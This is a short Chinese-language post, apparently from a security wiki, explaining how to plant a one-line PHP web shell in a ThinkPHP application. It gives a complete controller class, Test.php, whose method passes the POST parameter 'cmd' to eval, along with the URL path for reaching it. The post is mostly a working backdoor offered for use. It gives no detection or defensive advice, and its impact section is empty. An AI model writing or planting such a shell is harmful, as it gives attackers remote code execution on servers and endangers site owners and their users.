Thinkphp 专用shell
==================

一、漏洞简介
------------

基于thinkphp框架的一句话写法
thinkphp框架使用入口文件调用控制器，直接写一句话可能会有解析问题导致无法执行指令，研究了一下把一句话套入框架控制器的方法，分享给大家参考，

二、漏洞影响
------------

三、复现过程
------------

在index的控制器文件夹下建立Test.php文件，代码如下:

    <?php 
    namespace app\index\controller; 

    class Test 

    { 

        public function test() 

        { 

        eval($_POST["cmd"]); 

        } 

    }

一句话的地址就是http://www.0-sec.org/index/tes
